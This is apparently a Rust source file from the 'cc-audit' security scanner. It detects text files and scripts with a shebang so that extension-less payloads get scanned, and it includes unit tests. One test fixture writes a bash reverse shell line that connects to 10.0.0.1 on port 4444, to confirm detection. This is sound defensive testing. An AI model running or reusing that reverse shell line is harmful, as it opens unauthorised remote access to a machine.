//! Text file detection utilities.

use std::path::Path;

/// Interpreter basenames that, when named in a shebang line, mark a file as an
/// executable script worth scanning even when it has no recognized extension.
///
/// Kept intentionally focused on common scripting interpreters — the ones an
/// attacker would use to ship a payload as an extension-less executable.
const SHEBANG_INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python2", "python3", "ruby", "perl",
    "node", "deno", "php", "pwsh",
];

/// Returns `true` if the file begins with a `#!` shebang naming a known
/// interpreter (see `SHEBANG_INTERPRETERS`).
///
/// This exists so that extension-less executable scripts (e.g. a `scripts/hook`
/// with `#!/bin/bash`) are still scanned, closing a silent-evasion gap where the
/// inclusion logic was extension/name-allowlist only.
///
/// Only a small prefix of the file is read, so it stays cheap during directory
/// walks. Any I/O error (missing file, permission denied) or non-shebang content
/// yields `false`.
pub fn has_known_shebang(path: &Path) -> bool {
    use std::io::Read;

    let Ok(mut file) = std::fs::File::open(path) else {
        return false;
    };
    // Shebang lines are short; a small prefix is enough to cover
    // `#!/usr/bin/env python3` while avoiding pulling large binaries into memory.
    let mut buf = [0u8; 128];
    let Ok(n) = file.read(&mut buf) else {
        return false;
    };
    let prefix = &buf[..n];

    // Must start with the shebang magic number.
    let Some(rest) = prefix.strip_prefix(b"#!") else {
        return false;
    };

    // Consider only the first line.
    let line_end = rest.iter().position(|&b| b == b'\n').unwrap_or(rest.len());
    // Shebang lines are ASCII in practice; reject anything that is not valid UTF-8
    // (a strong signal the file is binary rather than a script).
    let Ok(line) = std::str::from_utf8(&rest[..line_end]) else {
        return false;
    };

    shebang_names_known_interpreter(line)
}

/// Parses a shebang line body (everything after `#!`) and returns whether it
/// invokes a known interpreter, handling `/usr/bin/env <interp>` indirection and
/// leading `env` flags such as `-S`.
fn shebang_names_known_interpreter(line: &str) -> bool {
    let mut tokens = line.split_whitespace();
    let Some(first) = tokens.next() else {
        return false;
    };

    // Basename of the interpreter path: `/usr/bin/python3` -> `python3`.
    let basename =
        |tok: &str| -> String { tok.rsplit(['/', '\\']).next().unwrap_or(tok).to_string() };

    let first_base = basename(first);

    // `#!/usr/bin/env python3` (optionally `env -S python3`) defers to the first
    // non-flag token after `env`.
    let interpreter = if first_base == "env" {
        match tokens.find(|tok| !tok.starts_with('-')) {
            Some(next) => basename(next),
            None => first_base,
        }
    } else {
        first_base
    };

    SHEBANG_INTERPRETERS.contains(&interpreter.as_str())
}

/// Check if a file is a cc-audit configuration file.
pub fn is_config_file(path: &Path) -> bool {
    const CONFIG_FILES: &[&str] = &[
        ".cc-audit.yaml",
        ".cc-audit.yml",
        ".cc-audit.json",
        ".cc-audit.toml",
        ".cc-auditignore",
    ];

    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| CONFIG_FILES.contains(&name))
}

/// Check if a file is a text file using the default configuration.
pub fn is_text_file(path: &Path) -> bool {
    static DEFAULT_CONFIG: std::sync::LazyLock<crate::config::TextFilesConfig> =
        std::sync::LazyLock::new(crate::config::TextFilesConfig::default);

    is_text_file_with_config(path, &DEFAULT_CONFIG)
}

/// Check if a file is a text file using the provided configuration.
pub fn is_text_file_with_config(path: &Path, config: &crate::config::TextFilesConfig) -> bool {
    // First try the config-based check
    if config.is_text_file(path) {
        return true;
    }

    // Additional checks for common patterns not easily captured in config
    if let Some(name) = path.file_name() {
        let name_str = name.to_string_lossy();
        let name_lower = name_str.to_lowercase();

        // Dotfiles are often text configuration files
        if name_str.starts_with('.') {
            return true;
        }

        // Files ending with "rc" are often configuration files
        if name_lower.ends_with("rc") {
            return true;
        }
    }

    // Last resort: an extension-less file may still be an executable script.
    // Peek the shebang so payloads shipped without a recognized extension are
    // not silently skipped.
    has_known_shebang(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_text_file_by_extension() {
        assert!(is_text_file(Path::new("test.md")));
        assert!(is_text_file(Path::new("test.txt")));
        assert!(is_text_file(Path::new("test.sh")));
        assert!(is_text_file(Path::new("test.py")));
        assert!(is_text_file(Path::new("test.js")));
        assert!(is_text_file(Path::new("test.rs")));
        assert!(is_text_file(Path::new("test.json")));
        assert!(is_text_file(Path::new("test.yaml")));
        assert!(is_text_file(Path::new("test.yml")));
        assert!(is_text_file(Path::new("test.toml")));
        assert!(is_text_file(Path::new("test.xml")));
        assert!(is_text_file(Path::new("test.html")));
        assert!(is_text_file(Path::new("test.css")));
        assert!(is_text_file(Path::new("test.go")));
        assert!(is_text_file(Path::new("test.rb")));
        assert!(is_text_file(Path::new("test.pl")));
        assert!(is_text_file(Path::new("test.php")));
        assert!(is_text_file(Path::new("test.java")));
        assert!(is_text_file(Path::new("test.c")));
        assert!(is_text_file(Path::new("test.cpp")));
        assert!(is_text_file(Path::new("test.h")));
        assert!(is_text_file(Path::new("test.hpp")));
        assert!(is_text_file(Path::new("test.cs")));
        assert!(is_text_file(Path::new("test.env")));
        assert!(is_text_file(Path::new("test.conf")));
        assert!(is_text_file(Path::new("test.cfg")));
        assert!(is_text_file(Path::new("test.ini")));
        assert!(is_text_file(Path::new("test.bash")));
        assert!(is_text_file(Path::new("test.zsh")));
        assert!(is_text_file(Path::new("test.ts")));
    }

    #[test]
    fn test_is_text_file_case_insensitive() {
        assert!(is_text_file(Path::new("test.MD")));
        assert!(is_text_file(Path::new("test.TXT")));
        assert!(is_text_file(Path::new("test.JSON")));
        assert!(is_text_file(Path::new("test.YAML")));
    }

    #[test]
    fn test_is_text_file_by_filename() {
        assert!(is_text_file(Path::new("Dockerfile")));
        assert!(is_text_file(Path::new("dockerfile")));
        assert!(is_text_file(Path::new("Makefile")));
        assert!(is_text_file(Path::new("makefile")));
        assert!(is_text_file(Path::new(".gitignore")));
        assert!(is_text_file(Path::new(".bashrc")));
        assert!(is_text_file(Path::new(".zshrc")));
        assert!(is_text_file(Path::new(".vimrc")));
    }

    #[test]
    fn test_is_text_file_returns_false_for_binary() {
        assert!(!is_text_file(Path::new("image.png")));
        assert!(!is_text_file(Path::new("binary.exe")));
        assert!(!is_text_file(Path::new("archive.zip")));
        assert!(!is_text_file(Path::new("document.pdf")));
        assert!(!is_text_file(Path::new("audio.mp3")));
        assert!(!is_text_file(Path::new("video.mp4")));
    }

    #[test]
    fn test_is_text_file_common_text_files() {
        assert!(is_text_file(Path::new("README")));
        assert!(is_text_file(Path::new("LICENSE")));
    }

    #[test]
    fn test_is_text_file_unknown_no_extension() {
        assert!(!is_text_file(Path::new("unknownfile123")));
    }

    #[test]
    fn test_is_text_file_detects_shebang_no_extension() {
        use std::io::Write;
        let dir = tempfile::TempDir::new().unwrap();
        let script = dir.path().join("payload"); // no extension, not a dotfile
        let mut f = std::fs::File::create(&script).unwrap();
        writeln!(f, "#!/bin/bash").unwrap();
        writeln!(f, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();
        assert!(
            is_text_file(&script),
            "no-extension file with a #!/bin/bash shebang must be treated as text"
        );
    }

    #[test]
    fn test_is_text_file_detects_env_interpreter_shebang() {
        use std::io::Write;
        let dir = tempfile::TempDir::new().unwrap();
        let script = dir.path().join("runme");
        let mut f = std::fs::File::create(&script).unwrap();
        writeln!(f, "#!/usr/bin/env python3").unwrap();
        writeln!(f, "print('hi')").unwrap();
        assert!(
            is_text_file(&script),
            "no-extension file with a `#!/usr/bin/env python3` shebang must be treated as text"
        );
    }

    #[test]
    fn test_is_text_file_no_shebang_no_extension_is_false() {
        let dir = tempfile::TempDir::new().unwrap();
        let f = dir.path().join("plainfile");
        std::fs::write(&f, b"just some text without a shebang").unwrap();
        assert!(
            !is_text_file(&f),
            "no-extension file without a shebang must not be treated as text"
        );
    }

    #[test]
    fn test_is_text_file_binary_no_extension_is_false() {
        let dir = tempfile::TempDir::new().unwrap();
        let f = dir.path().join("blob");
        // ELF magic bytes: clearly a binary, must not be picked up.
        std::fs::write(&f, [0x7fu8, 0x45, 0x4c, 0x46, 0x00, 0x01, 0x02]).unwrap();
        assert!(!is_text_file(&f), "binary file must not be treated as text");
    }

    #[test]
    fn test_is_text_file_unknown_interpreter_shebang_is_false() {
        use std::io::Write;
        let dir = tempfile::TempDir::new().unwrap();
        let f = dir.path().join("weird");
        let mut fh = std::fs::File::create(&f).unwrap();
        writeln!(fh, "#!/opt/custom/frobnicator").unwrap();
        writeln!(fh, "do stuff").unwrap();
        assert!(
            !is_text_file(&f),
            "shebang naming an unknown interpreter must not be treated as text"
        );
    }

    #[test]
    fn test_has_known_shebang_missing_file_is_false() {
        assert!(!has_known_shebang(Path::new("/nonexistent/script-xyz")));
    }

    #[test]
    fn test_is_config_file() {
        assert!(is_config_file(Path::new(".cc-audit.yaml")));
        assert!(is_config_file(Path::new(".cc-audit.yml")));
        assert!(is_config_file(Path::new(".cc-audit.json")));
        assert!(is_config_file(Path::new(".cc-audit.toml")));
        assert!(is_config_file(Path::new(".cc-auditignore")));
        assert!(!is_config_file(Path::new("other.yaml")));
        assert!(!is_config_file(Path::new("config.yaml")));
    }
}
